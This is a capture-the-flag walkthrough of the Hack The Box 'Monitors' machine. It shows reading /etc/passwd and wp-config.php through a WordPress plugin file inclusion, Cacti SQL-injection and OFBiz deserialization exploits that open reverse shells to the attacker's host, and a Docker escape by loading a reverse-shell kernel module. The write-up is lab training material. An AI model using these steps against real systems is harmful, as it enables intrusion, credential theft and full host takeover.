# Monitors

First as always, `nmap`

```
# Nmap 7.92 scan initiated Thu Sep 16 13:03:21 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.10.238
Nmap scan report for 10.10.10.238
Host is up, received syn-ack (0.098s latency).
Scanned at 2021-09-16 13:03:28 +07 for 10s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5AeQDHYQGVg8GiNvPYiXYPseampZJusZb2Dbd2d1QIi7a/LGOO9ylbMgjxcve5euzCFBMSX2rVIp8zkUg3CCi7JYLpyQAeP0npjT/fB84dWbzt51Xmfir4qZTpBMf8Lw+ZFxEXv1UkGfejSZ3fjcuZ2hBBeUh63P2qcomVla/eUyR1dOIvJy8K1pl1WSXia6W2fJsBj/uowwe4+aMtWGVlzMNd+Tpp1Z8lg/a2jZTxkdIYvUkx/k0x0xrjsUhGiLgOoAWg4JvKeYoy+v/hhAjh6fB8Kw7jS1t1Si69cPadEQGB8NOMdyDv4EvoG3/8BvLpMgpHKzy1aHsJk9zqyej
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHKAgNKkq5XDcAfsuuxZFMPf+iEHjoq9DUmOmg0cCDgpE90GNOZeoaI24IlwlrSdTWTRA9HNJ7DFyIkcHr37Dk=
|   256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBi/L9gWCzbJ6GzFB1PsHZJco24eJW3wmC+a4Ul6fEe6
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 16 13:03:38 2021 -- 1 IP address (1 host up) scanned in 17.24 seconds
```

Going to the web server using the IP, we get the following message.

```
Sorry, direct IP access is not allowed.

If you are having issues accessing the site then contact the website administrator: admin@monitors.htb
```

We add `monitors.htb` to our `/etc/hosts`, note the username, and fuzz for subdomains.

```sh
$ ffuf -u "http://monitors.htb/" -H "Host: FUZZ.monitors.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 150
```

This, however, gives us nothing.

Looking around at `http://monitors.htb/`, we find that we have a Wordpress site, which can be identified by the line "Powered by Wordpress" in the bottom right, so we run `wpscan`.

```sh
$ wpscan --url http://monitors.htb/ -e ap,at,tt,cb,dbe,u1-10,m1-10 --plugins-detection mixed
```

Among the results is the "spritz" plugin

```
[i] Plugin(s) Identified:                                                          > (811 / 95035)  0.85%  ETA: 00:36:30
[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 | Readme: http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/, status: 200
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
```

Looking up `spritz` with `searchsploit` gives us a remote file inclusion vulnerability.

```
WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                          | php/webapps/44544.php
```

Trying the provided PoC URL, we're able to read `/etc/passwd` with `http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd`, and with that we also have the user "marcus" who has a shell on the machine. We can then grab `wp-config.php` with `http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php`. Inside that we have credentials for the database.

```php
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
```

I tried using the password to SSH in as "www-data" and "marcus" but to no avail.

Checking [other interesting files](https://book.hacktricks.xyz/pentesting-web/file-inclusion#linux), I found that `/etc/apache2/sites-enabled/000-default.conf` contains a new sub-domain.

```
# Add cacti-admin.monitors.htb.conf
```

Going there, we have cacti. [I tried the default credentials but it doesn't work because admins are asked to change the password upon first login](https://www.mxwiki.com/password/cacti/cacti-default-admin-password). We can, however, use the password previously found in `wp-config.php` to log in as "admin".

Looking at the source code, we see that we have cacti version 1.2.12.

```javascript
var cactiVersion='1.2.12';
```

Looking for an exploit for this version of cacti with `searchsploit`, we have one.

```
Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution                        | php/webapps/49810.py
```

Running the exploit should give us a shell on the machine as `www-data`.

```sh
./49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost YOUR_IP --lport YOUR_PORT
```

Looking at `/home`, we have a single user "marcus" so we look around for a way to escalate to marcus in addition to root. Running linpeas didn't give anything immediately useful and marcus has `user.txt` in his home so I switch my focus to escalating to marcus.

Looking in `/etc` ...

```
$ grep marcus /etc -RH 2>/dev/null
/etc/group-:marcus:x:1000:
/etc/subgid:marcus:165536:65536
/etc/group:marcus:x:1000:
/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
/etc/subuid:marcus:165536:65536
/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
```

We find that we have the `cacti-backup` service running `/home/marcus/.backup/backup.sh`. Checking the script ...

```sh
www-data@monitors:/$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

We have a password we can use to `su` into `marcus` and can grab `user.txt`.

Looking at open ports ...

```
marcus@monitors:~$ ss -tlnp
State         Recv-Q          Send-Q                    Local Address:Port                   Peer Address:Port
LISTEN        0               128                       127.0.0.53%lo:53                          0.0.0.0:*
LISTEN        0               128                             0.0.0.0:22                          0.0.0.0:*
LISTEN        0               128                           127.0.0.1:8443                        0.0.0.0:*
LISTEN        0               80                            127.0.0.1:3306                        0.0.0.0:*
LISTEN        0               128                                [::]:22                             [::]:*
LISTEN        0               128                                   *:80                                *:*
```

We see something running on port 8443, likely a web server. We want to check it out so we put put an SSH key in marcus' `authorized_keys` and SSH port forward.

```sh
$ ssh -i id_rsa marcus@monitors.htb -L 8443:localhost:8443 -N
```

Looking at the web page, we see that we're running Apache Tomcat/9.0.31. Running `gobuster` ...

```
/images               (Status: 302) [Size: 0] [--> /images/]
/content              (Status: 302) [Size: 0] [--> /content/]
/common               (Status: 302) [Size: 0] [--> /common/]
/catalog              (Status: 302) [Size: 0] [--> /catalog/]
/marketing            (Status: 302) [Size: 0] [--> /marketing/]
/ecommerce            (Status: 302) [Size: 0] [--> /ecommerce/]
/ap                   (Status: 302) [Size: 0] [--> /ap/]
/ar                   (Status: 302) [Size: 0] [--> /ar/]
/ebay                 (Status: 302) [Size: 0] [--> /ebay/]
/manufacturing        (Status: 302) [Size: 0] [--> /manufacturing/]
/passport             (Status: 302) [Size: 0] [--> /passport/]
/example              (Status: 302) [Size: 0] [--> /example/]
/bi                   (Status: 302) [Size: 0] [--> /bi/]
/accounting           (Status: 302) [Size: 0] [--> /accounting/]
/webtools             (Status: 302) [Size: 0] [--> /webtools/]
/tomahawk             (Status: 302) [Size: 0] [--> /tomahawk/]
/facility             (Status: 302) [Size: 0] [--> /facility/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
/myportal             (Status: 302) [Size: 0] [--> /myportal/]
/sfa                  (Status: 302) [Size: 0] [--> /sfa/]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 804]
/http%3A%2F%2Fblog    (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]
/bluelight            (Status: 302) [Size: 0] [--> /bluelight/]
```

We find by visiting the found directories that we have OFBiz running. Looking up "ofbiz" in metasploit gives us a couple of exploit, of which I found `exploit/linux/http/apache_ofbiz_deserialization` to work, though I did have to change the payload to be `linux/x86/shell/reverse_tcp` and set `forceexploit` to `true`. Running the exploit should give as a shell as root. However, there's no `root.txt` in `/root`. Checking `/` ...

```sh
root@cd94ed83e4af:/root# ls -la /
ls -la /
total 11840
drwxr-xr-x   1 root root     4096 Sep 16 04:56 .
drwxr-xr-x   1 root root     4096 Sep 16 04:56 ..
-rwxr-xr-x   1 root root        0 Sep 16 04:56 .dockerenv
drwxr-xr-x   1 root root     4096 Apr  9 07:55 bin
drwxr-xr-x   2 root root     4096 Jul 10  2020 boot
drwxr-xr-x   5 root root      340 Sep 16 04:56 dev
drwxr-xr-x   1 root root     4096 Sep 16 04:56 etc
drwxr-xr-x   2 root root     4096 Jul 10  2020 home
drwxr-xr-x   1 root root     4096 Apr  9 07:55 lib
drwxr-xr-x   2 root root     4096 Sep  8  2020 lib64
-rw-r--r--   1 root root  1094968 Jan 13  2021 linux-headers-4.15.0-132-generic_4.15.0-132.136_amd64.deb
-rw-r--r--   1 root root 10937008 Jan 13  2021 linux-headers-4.15.0-132_4.15.0-132.136_all.deb
drwxr-xr-x   2 root root     4096 Sep  8  2020 media
drwxr-xr-x   2 root root     4096 Sep  8  2020 mnt
drwxr-xr-x   2 root root     4096 Sep  8  2020 opt
dr-xr-xr-x 223 root root        0 Sep 16 04:56 proc
drwx------   1 root root     4096 Sep 16 09:29 root
drwxr-xr-x   3 root root     4096 Sep  8  2020 run
drwxr-xr-x   1 root root     4096 Apr  9 07:55 sbin
drwxr-xr-x   2 root root     4096 Sep  8  2020 srv
dr-xr-xr-x  13 root root        0 Sep 16 04:56 sys
drwxrwxrwt   1 root root     4096 Sep 16 09:27 tmp
drwxr-xr-x   1 root root     4096 Sep  8  2020 usr
drwxr-xr-x   1 root root     4096 Sep  8  2020 var
```

We see `.dockerenv`, meaning we're in a docker container and we need to somehow break out of the container. To enumerate on that, I ran [deepce](https://github.com/stealthcopter/deepce). In the results is a couple of dangerous capabilities.

```
[+] Dangerous Capabilities .. Yes
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

The highlighted capabilities are `dac_override` and `cap_sys_module`. Looking at [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#container-capabilities), we see that `cap_sys_module` is useful for escaping the container. Following [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-with-environment-docker-breakout-2) I try to get a reverse shell. However, there were some errors between me and the shell I wanted.

```sh
root@63f635a59211:/tmp/esc# make
make -C /lib/modules/4.15.0-151-generic/build M=/tmp/esc modules
make[1]: *** /lib/modules/4.15.0-151-generic/build: No such file or directory.  Stop.
make: *** [Makefile:4: all] Error 2
```

First problem is that the kernel version from `uname -r` is not there in `/lib/modules/`. I hard-coded the value `4.15.0-142-generic` from `ls /lib/modules` in place of `uname -r` and rerun `make`.

```sh
root@c6ea5b0cd73c:/tmp/esc# make
make -C /lib/modules/4.15.0-142-generic/build M=/tmp/esc modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
  CC [M]  /tmp/esc/reverse-shell.o
gcc: error trying to exec 'cc1': execvp: No such file or directory
make[2]: *** [scripts/Makefile.build:339: /tmp/esc/reverse-shell.o] Error 1
make[1]: *** [Makefile:1584: _module_/tmp/esc] Error 2
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
make: *** [Makefile:5: all] Error 2
```

This time, the problem us that `cc1` is missing, and we need it to compile our code. With some research, we find that `cc1` is part of the package `gcc` which is part of the meta-package `build-essential`. Without internet on the machine though, we have to install things manually without the convenience of `apt install`.

Checking `/etc/os-release`, we see that we're working with Debian 10 (buster).

```sh
root@c6ea5b0cd73c:/tmp/esc# cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

Looking up "debian 10 build-essential" gives us [this page](https://debian.pkgs.org/10/debian-main-amd64/build-essential_12.6_amd64.deb.html) which has the `.deb` for `build-essential` as well as a list of its requirements, and those requirements also have their own requirements. We need to download and install all of that. We do, however, have a lot of packages to go through and I'm lazy so I pulled a docker image of Debian 10 and get the `.deb` files from there.

My work flow for getting the `.deb` files was as follows

1. `docker pull debian:10` to pull the image
2. `docker run -it debian:10 /bin/bash` to run the image with a shell
3. Following [this stackexchange answer](https://unix.stackexchange.com/a/313117), `apt install apt-rdepends` and run `apt-rdepends "build-essential" | grep -v ^\ | tr '\n' ' '` to get all the packages (not downloading yet because `libc-dev` can't be found)
4. `apt download` with all the packages except `libc-dev`
5. Transfer `.deb` files (I `zip`'d them first) to the host attacking machine
5. Download `libc-dev` from [here](https://debian.pkgs.org/10/debian-main-amd64/libc-dev-bin_2.28-10_amd64.deb.html)
6. Realize that there's already `libc-dev-bin_2.28-10_amd64.deb` in the downloaded `.deb` files
7. Transfer all the `.deb` files to the target and `dpkg -i *.deb`

After the installation, we can try compiling our reverse shell.

```sh
root@c6ea5b0cd73c:/tmp/esc# make
make -C /lib/modules/4.15.0-142-generic/build M=/tmp/esc modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
  CC [M]  /tmp/esc/reverse-shell.o
cc1: error: code model kernel does not support PIC mode
make[2]: *** [scripts/Makefile.build:339: /tmp/esc/reverse-shell.o] Error 1
make[1]: *** [Makefile:1584: _module_/tmp/esc] Error 2
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
make: *** [Makefile:5: all] Error 2
```

Another error! I tried running `make clean` and `make all` again and it compiled. All that's left is to open a listener and load the module.

```sh
insmod reverse-shell.ko
```

With that, we should have a root shell on the host machine.
